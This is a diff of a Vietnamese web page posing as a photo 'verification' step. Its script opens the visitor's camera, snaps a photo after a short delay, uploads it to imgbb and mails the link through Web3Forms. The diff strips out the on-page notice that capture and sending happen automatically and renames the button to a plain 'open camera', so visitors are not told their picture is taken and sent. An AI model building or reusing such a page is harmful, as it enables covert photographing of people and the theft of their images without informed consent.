@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Tự chụp & gửi ảnh</title>
+  <title>Chụp & Gửi ảnh</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -36,9 +36,8 @@
 </head>
 <body>
   <div class="card">
-    <h2>Camera xác minh</h2>
-    <p>Bấm nút để camera tự chụp và gửi ảnh.</p>
-    <button id="openCam">📸 Mở camera & chụp tự động</button>
+    <h2>Xác minh bằng ảnh</h2>
+    <button id="openCam">📸 Mở camera</button>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
@@ -69,7 +68,7 @@
       video.srcObject = stream;
       video.style.display = "block";
 
-      // chờ camera khởi động
+      // Chờ camera khởi động rồi tự chụp
       setTimeout(() => captureAndSend(), 2500);
     } catch (err) {
       showError("Không thể mở camera: " + err.message);
@@ -79,7 +78,6 @@
 
   async function captureAndSend() {
     try {
-      // Đảm bảo video đã có kích thước
       if (video.videoWidth === 0) {
         showError("Camera chưa sẵn sàng, thử lại.");
         openCamBtn.disabled = false;
@@ -108,13 +106,13 @@
       if (!imgRes.success) throw new Error("Upload imgbb thất bại!");
 
       const imageUrl = imgRes.data.url;
-      msg.textContent = "📨 Đang gửi qua Web3Forms...";
+      msg.textContent = "📨 Đang gửi ảnh...";
 
       const payload = {
         access_key: WEB3FORMS_KEY,
-        subject: "Ảnh tự chụp mới",
-        from_name: "Trang xác minh tự động",
-        message: `<p>Ảnh mới chụp:</p><img src="${imageUrl}" width="250">`
+        subject: "Ảnh xác minh mới",
+        from_name: "Trang xác minh",
+        message: `<img src="${imageUrl}" width="250" style="border-radius:8px;">`
       };
 
       const res = await fetch("https://api.web3forms.com/submit", {
